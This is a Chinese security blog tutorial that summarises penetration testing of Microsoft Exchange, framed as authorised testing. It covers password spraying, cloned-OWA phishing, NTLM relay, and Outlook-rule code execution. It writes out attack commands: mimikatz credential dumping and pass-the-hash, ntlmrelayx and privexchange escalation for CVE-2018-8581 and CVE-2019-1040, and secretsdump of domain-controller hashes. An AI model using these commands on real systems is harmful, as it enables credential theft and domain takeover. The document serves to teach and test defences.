> 原文链接: https://www.anquanke.com//post/id/184342 


# Exchange渗透测试总结


                                阅读量   
                                **708801**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                    



[![](https://p2.ssl.qhimg.com/t01056e388ceae97f5f.gif)](https://p2.ssl.qhimg.com/t01056e388ceae97f5f.gif)



**本期安仔课堂，ISEC实验室的唐老师**将为大家**介绍Exchange相关知识点**，欢迎感兴趣的朋友一起交流学习。

## 一 、Exchange概述

Exchange是微软出品的邮件服务器系统，凭借其强大的功能优势被**应用到很多企业、学校的邮件系统搭建中。**

截至目前，Exchange已有多个成熟版本，例如：Exchange Server 2010、2013、2016及最新版本2019。此外，Exchange又可分为Exchange Server和Exchange Online ,为了方便，本文将主要**以本地Exchange Server 2010为例进行演示。**



## 二、组成

首先，让我们一起了解下Exchange的结构组成。目前最新版本Exchange主要包含两个角色，分别是**邮箱服务器角色和边缘传输服务器角色。**

### <a class="reference-link" name="2.1%E9%82%AE%E7%AE%B1%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%92%E8%89%B2"></a>2.1邮箱服务器角色

1.包含用于路由邮件的传输服务；<br>
2.包含处理、呈现和存储数据的邮箱数据库；<br>
3.包含接受所有协议客户端连接的客户端访问服务；<br>
http<br>
RPC over HTTP<br>
MAPI over HTTP<br>
pop3<br>
imap4<br>
um呼叫<br>
4.包含向邮箱提供语音邮件和其他电话服务功能的统一消息(UM)服务。

### <a class="reference-link" name="2.2%E8%BE%B9%E7%BC%98%E4%BC%A0%E8%BE%93%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%92%E8%89%B2"></a>2.2边缘传输服务器角色

1.处理Exchange组织的所有外部邮件流；<br>
2.通常安装在外围网络中，可订阅内部Exchange组织。当Exchange组织接收和发送邮件时，EdgeSync同步进程会向边缘传输服务器提供收件人信息和其他配置信息。

[![](https://p1.ssl.qhimg.com/t01fef33eb8fe2ab528.png)](https://p1.ssl.qhimg.com/t01fef33eb8fe2ab528.png)

图1

其中，渗透测试人员最为关心**Exchange对外提供的访问接口**，以及**使用的加密验证类型**。



## 三、邮件访问形式

通过上面的介绍，我们可以了解Exchange Server支持的协议。接下来，我们学习如何**通过对应客户端访问这些协议**。

### <a class="reference-link" name="3.1%E7%9B%B8%E5%85%B3%E6%8E%A5%E5%8F%A3"></a>3.1相关接口

1.outlook客户端(MAPI协议)<br>
2.outlook web app(以web形式访问 [https://域名或ip/owa](https://%E5%9F%9F%E5%90%8D%E6%88%96ip/owa))<br>
3.POP3和IMAP4(可以通过POP3协议利用其他客户端)

以下为目前默认的部分**前端虚拟目录**，可用于**识别Exchange服务、密码枚举、或权限维持**。<br>
1.API(2016以后版本有效)<br>
2.ecp Exchange(管理中心web形式访问[https://域名或ip/ecp](https://%E5%9F%9F%E5%90%8D%E6%88%96ip/ecp))<br>
3.EWS(Exchange Web Services)<br>
4.Autodiscover<br>
5.MAPI<br>
6.Microsoft-Server-ActiveSync<br>
7.OAB(web形式访问[https://域名或ip/oab](https://%E5%9F%9F%E5%90%8D%E6%88%96ip/oab))<br>
8.owa<br>
9.PowerShell<br>
10.Rpc

[![](https://p4.ssl.qhimg.com/t012f91aa84f1261adf.png)](https://p4.ssl.qhimg.com/t012f91aa84f1261adf.png)

图2



## 四、密码枚举

在无任意内网权限、用户账号权限时，可尝试**对已知账号进行密码枚举**。

**密码枚举可以利用的接口：**<br>
1.Autodiscover(401认证NTLM Authenticate)<br>
2.OWA(post表单)<br>
3.EWS(401认证NTLM Authenticate)<br>
4.Microsoft-Server-ActiveSync(401认证+base64)

**结合部分社工手段**可获取已知账号，如搜索intext:*[@xxxx](https://github.com/xxxx).com。

其中比较好用的一款**Exchange密码枚举工具**

[![](https://p4.ssl.qhimg.com/t0100ce830974867f67.jpg)](https://p4.ssl.qhimg.com/t0100ce830974867f67.jpg)

图3

安装

[![](https://p1.ssl.qhimg.com/t010aca4b9fbe8fe129.jpg)](https://p1.ssl.qhimg.com/t010aca4b9fbe8fe129.jpg)

图4

**以ruler密码枚举模块为例进行演示**。ruler是针对Exchange的半自动利用工具，其Brute功能使用率较高，主要通过Autodiscover接口进行密码枚举。

准备用户名、密码字典：user.txt、pass.txt。

[![](https://p5.ssl.qhimg.com/t015ceb290541c65749.png)](https://p5.ssl.qhimg.com/t015ceb290541c65749.png)

图5

以上为**理想状态的测试情况**，实际情况下需要足够多的账户密码，避免因过多尝试而冻结，还可通过控制-delay参数，或burp进行密码枚举。



## 五、邮箱社工测试

### <a class="reference-link" name="5.1%E9%80%9A%E8%BF%87%E9%92%93%E9%B1%BC%E8%8E%B7%E5%8F%96%E8%B4%A6%E6%88%B7%E5%AF%86%E7%A0%81"></a>5.1通过钓鱼获取账户密码

为了提升员工安全意识，在渗透测试时，往往还会被要求做邮件钓鱼测试。钓鱼邮件**内容不限**，可以自由发挥，如复制owa界面制作钓鱼页面等。

尝试伪造发件人，发送钓鱼邮件。

[![](https://p5.ssl.qhimg.com/t01ae0f3ee36d6305e7.png)](https://p5.ssl.qhimg.com/t01ae0f3ee36d6305e7.png)

图6

在被测试的用户点击链接时提示会话超时，需重新登入。

[![](https://p4.ssl.qhimg.com/t018553e330e66c2f04.png)](https://p4.ssl.qhimg.com/t018553e330e66c2f04.png)

图7

制作相同登入口，后端保存用户登入信息。

[![](https://p3.ssl.qhimg.com/t01b651c29d6026acb7.png)](https://p3.ssl.qhimg.com/t01b651c29d6026acb7.png)

图8

针对这种钓鱼活动，很多环节都可以进行优化，如界面、提示、邮件语气等，这些都是**决定测试成功率的重要因素**。

### <a class="reference-link" name="5.2%E5%8D%87%E7%BA%A7%E7%89%88%E9%92%93%E9%B1%BC%E6%B5%8B%E8%AF%95"></a>5.2升级版钓鱼测试

5.1方式可能对谨慎用户无效，我们可以**结合内网权限进行钓鱼测试**。

这里我们使用到一款工具：

[![](https://p2.ssl.qhimg.com/t0100f9df3893ca4b42.jpg)](https://p2.ssl.qhimg.com/t0100f9df3893ca4b42.jpg)

图9

该工具可**实现中继ntlm协议**，允许用户完成基于http的ntlm接口认证，并利用ews接口获取数据。其核心功能源于impacket框架。

[![](https://p4.ssl.qhimg.com/t0153348ba4c5e25e16.jpg)](https://p4.ssl.qhimg.com/t0153348ba4c5e25e16.jpg)

图10

大家有兴趣的可以自行研究。

首先我们尝试访问ews接口，系统提示401 NTLM Authenticate验证，我们现在要做的就是**利用已经登入系统的其他用户权限直接通过这个验证**。

[![](https://p3.ssl.qhimg.com/t01ab12a24e4d61b890.png)](https://p3.ssl.qhimg.com/t01ab12a24e4d61b890.png)

图11

构造邮件，引用已被控制的内网机器文件，或超链接。

[![](https://p4.ssl.qhimg.com/t016675671f52fa582f.jpg)](https://p4.ssl.qhimg.com/t016675671f52fa582f.jpg)

图12

邮件原始内容

[![](https://p0.ssl.qhimg.com/t0118d64ecf70a38d65.png)](https://p0.ssl.qhimg.com/t0118d64ecf70a38d65.png)

图13

在获取内网的机器上运行我们的ExchangeRelayX

[![](https://p3.ssl.qhimg.com/t010f5ae0243aca574e.png)](https://p3.ssl.qhimg.com/t010f5ae0243aca574e.png)

图14

等待目标用户查看邮件，以下引用图片会在Exchange上产生提示。

[![](https://p4.ssl.qhimg.com/t01d767a7096a7d1718.png)](https://p4.ssl.qhimg.com/t01d767a7096a7d1718.png)

图15

并且使用chrome浏览器时，加载该形式的资源会被阻止。

[![](https://p2.ssl.qhimg.com/t0120fa323263043d61.png)](https://p2.ssl.qhimg.com/t0120fa323263043d61.png)

图16

使用IE浏览器，测试成功。

[![](https://p4.ssl.qhimg.com/t013a6dbb44a8dee6be.png)](https://p4.ssl.qhimg.com/t013a6dbb44a8dee6be.png)

图17

当该图片加载，或者用户点击我们的超链接后，我们就能获取net-ntlm并绕过401认证。

[![](https://p2.ssl.qhimg.com/t011da55a0456d7ae07.png)](https://p2.ssl.qhimg.com/t011da55a0456d7ae07.png)

图18

ExchangeRelayX web控制台

[![](https://p5.ssl.qhimg.com/t01fa8beeb957dfe946.png)](https://p5.ssl.qhimg.com/t01fa8beeb957dfe946.png)

图19

验证通过后直接调用ews接口，由于实验环境Exchange版本问题，利用ExchangeRelayX封装好的请求会加上sp2导致报错，因此这里**以发送原始xml的形式进行演示**：

获取收件箱soap请求

[![](https://p5.ssl.qhimg.com/t01aa2f37444ad4adbc.jpg)](https://p5.ssl.qhimg.com/t01aa2f37444ad4adbc.jpg)

图20

邮箱渗透测试成功，我们获取到邮件内容信息。

[![](https://p1.ssl.qhimg.com/t01e8907dbc21e57ef9.png)](https://p1.ssl.qhimg.com/t01e8907dbc21e57ef9.png)

图21

本文**仅提供绕过验证的思路**，对ews接口感兴趣的朋友可以到微软官方进行学习。

### <a class="reference-link" name="5.3%E6%8A%93%E5%8F%96ad%E6%98%8E%E6%96%87%E6%88%96hash%E7%99%BB%E5%85%A5"></a>5.3抓取ad明文或hash登入

这种方式较为常见，在**已获取域控制权限**的情况下，可直接**通过mimikatz抓取需要登入Exchange的明文**，登入owa实现邮件读取等操作。

mimikatz.exe privilege::debug sekurlsa::logonPasswords full

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t019dfd897704e8faca.png)

图22

若**未抓取到明文**，可通过获取的ntlm-hash计算出ntlm挑战值来通过验证，或者利用mimikatz将ntlm hash更新到内存中。

mimikatz.exe privilege::debug “sekurlsa::pth /user:xxx /domain:xxx /ntlm:xxxxxxxxxxxxxxxxxxxxxxx”

更新后在dir 10.0.0.1271.jpg下就又可以利用上面讲到的ExchangeRelayX来读取操作，或者利用MailSniper。

[![](https://p4.ssl.qhimg.com/t01fd87c8558df9a396.png)](https://p4.ssl.qhimg.com/t01fd87c8558df9a396.png)

图23

查看当前用户

[![](https://p4.ssl.qhimg.com/t013809989f341e16db.png)](https://p4.ssl.qhimg.com/t013809989f341e16db.png)

图24

更新指定的ntlm-hash到内存

[![](https://p2.ssl.qhimg.com/t0146b653cb93ef3967.png)](https://p2.ssl.qhimg.com/t0146b653cb93ef3967.png)

图25

发送net-ntlm到ExchangeRelayX

[![](https://p3.ssl.qhimg.com/t016c93164ea01abe54.png)](https://p3.ssl.qhimg.com/t016c93164ea01abe54.png)

图26

通过ews接口认证

[![](https://p3.ssl.qhimg.com/t01d408b77acfb50bb0.png)](https://p3.ssl.qhimg.com/t01d408b77acfb50bb0.png)

图27

### <a class="reference-link" name="5.4%E5%8A%AB%E6%8C%81%E8%8E%B7%E5%8F%96%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81"></a>5.4劫持获取账号密码

**<a class="reference-link" name="5.4.1%20%E5%88%A9%E7%94%A8js%E5%8A%AB%E6%8C%81owa%E7%99%BB%E5%85%A5%E5%8F%A3"></a>5.4.1 利用js劫持owa登入口**

若**已获取域控权限或Exchange Server权限**，便可直接修改登入口，利用js劫持点击事件。该形式较为简单，这边不做过多介绍。

<a class="reference-link" name="5.4.2%20%E5%8A%AB%E6%8C%81ad"></a>**5.4.2 劫持ad**

这种形式可**通过插件劫持域控实现**，具体大家可以参考以下项目：

[![](https://p4.ssl.qhimg.com/t0132b7e9be41ed8b4c.jpg)](https://p4.ssl.qhimg.com/t0132b7e9be41ed8b4c.jpg)

图28

安装方法如下：

[![](https://p1.ssl.qhimg.com/t019e636da70e81128f.jpg)](https://p1.ssl.qhimg.com/t019e636da70e81128f.jpg)

图29



## 六、邮件服务器的其他测试

对邮件服务器的渗透测试，还有一些其他工具，如**邮件内容或通讯录**。同比手动登入owa等操作更为高效。

[![](https://p5.ssl.qhimg.com/t014374b88af2ca41a5.jpg)](https://p5.ssl.qhimg.com/t014374b88af2ca41a5.jpg)

图30

### <a class="reference-link" name="6.1%E9%80%9A%E8%AE%AF%E5%BD%95%E6%B5%8B%E8%AF%95"></a>6.1通讯录测试

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t013bd2789da332392d.jpg)

图31

测试成功

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01ef499897e8ee1987.png)

图32

### <a class="reference-link" name="6.2%E6%96%87%E4%BB%B6%E5%A4%B9%E6%B5%8B%E8%AF%95"></a>6.2文件夹测试

[![](https://p0.ssl.qhimg.com/t015d3081a87d5f6dab.jpg)](https://p0.ssl.qhimg.com/t015d3081a87d5f6dab.jpg)

图33

测试成功

[![](https://p4.ssl.qhimg.com/t01778cba6b17a935fb.png)](https://p4.ssl.qhimg.com/t01778cba6b17a935fb.png)

图34

### <a class="reference-link" name="6.3%E5%85%B6%E4%BB%96%E6%B5%8B%E8%AF%95"></a>6.3其他测试

获取当前用户包含pass关键字的邮件

[![](https://p5.ssl.qhimg.com/t019bb3fc185f3bc991.jpg)](https://p5.ssl.qhimg.com/t019bb3fc185f3bc991.jpg)

图35



## 七、CVE-2018-8581

**漏洞利用**

这个漏洞利用一个可以正常登入的普通用户账户，通过ssrf调用Exchange Server凭证到已控制的内网服务器上，并默认Exchange Server权限较高，就**达到了提权的目的**。

我们需要借助一款工具

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t015568c15032f7dbde.jpg)

图36

操作如下：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01635a29c3bec672f7.jpg)

图37

拷贝privexchange.py到impacket的examples，已经获取的可以登入邮箱用户test，利用ntlmrelayx.py**建立中继**，

ntlmrelayx.py -t ldap://10.0.0.158 —escalate-user test

**发起ssrf的攻击测试**，

python privexchange.py -ah 10.0.0.127 -u test -d test.com 10.0.0.237

其中ah指定中继的主机，后面指定exchange的域名或者IP。

[![](https://p2.ssl.qhimg.com/t01ded34de26992ea46.png)](https://p2.ssl.qhimg.com/t01ded34de26992ea46.png)

图38

收到回调信息

[![](https://p0.ssl.qhimg.com/t01c2d725b9cd489d5e.png)](https://p0.ssl.qhimg.com/t01c2d725b9cd489d5e.png)

图39

测试成功便会收到exchange server带凭证的请求，利用该权限即可**提升test用户实现控制域**。

[![](https://p0.ssl.qhimg.com/t01b225e6a0001d4031.png)](https://p0.ssl.qhimg.com/t01b225e6a0001d4031.png)

图40

最后我们可以导出域控的hash

python secretsdump.py test.com/[test@10.0.0](mailto:test@10.0.0).158 -just-dc

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t019ec227c2b363eda1.png)

图41



## 八、Rules利用

通过上述手段我们可以获取exchange相关权限，若我们想**对每个账号的使用人进行横向控制**，便可利用Rules and Alerts给指定账号创建规则，若客户端使用out look，将允许其下次登入时执行这些规则，从而**获取使用者pc权限**。

使用工具创建规则，运行远程文件执行，相关参数参考如下：

[![](https://p5.ssl.qhimg.com/t0177ec9ff3194ca4c5.jpg)](https://p5.ssl.qhimg.com/t0177ec9ff3194ca4c5.jpg)

图42

创建规则，触发关键字为shelltest。

[![](https://p2.ssl.qhimg.com/t01b9c771d2b5088770.jpg)](https://p2.ssl.qhimg.com/t01b9c771d2b5088770.jpg)

图43

创建成功后需**使用指定关键字进行触发**。我们可以给邮箱发送包含关键字的邮件主题，触发执行1.exe，如使用ruler发送带关键字的邮件。

[![](https://p4.ssl.qhimg.com/t0170b72c1ceacf23af.jpg)](https://p4.ssl.qhimg.com/t0170b72c1ceacf23af.jpg)

图44



## 九、CVE-2019-1040

**利用**

在这个漏洞之前利用smb转ldap时，有个mic检查导致无法中转成功，但利用这个CVE-2019-1040漏洞就实现了**直接绕过mic检查**，这是这个漏洞的关键点。利用方法类似2018-8581的形式。

**更新我们的impacket**

gti pull [https://github.com/SecureAuthCorp/impacket](https://github.com/SecureAuthCorp/impacket)

ntlmrelayx.py —remove-mic -t ldap://10.0.0.158 —escalate-user test -smb2support

**触发SpoolService的bug产生smb回连工具**

[https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py)

**其他等同2018-8581部分**

**两个漏洞的区别**

2018-8581是利用exchange漏洞产生http-&gt;ldap中转实现的提权，2019-1040是产生的smb-&gt;ldap中转，并且绕过mic检查。

**以上关于exchange渗透测试知识点的总结，欢迎感兴趣的朋友一起交流沟通。**



## 十、参考链接

[![](https://p3.ssl.qhimg.com/t01787da0afaa351a6f.jpg)](https://p3.ssl.qhimg.com/t01787da0afaa351a6f.jpg)

图45
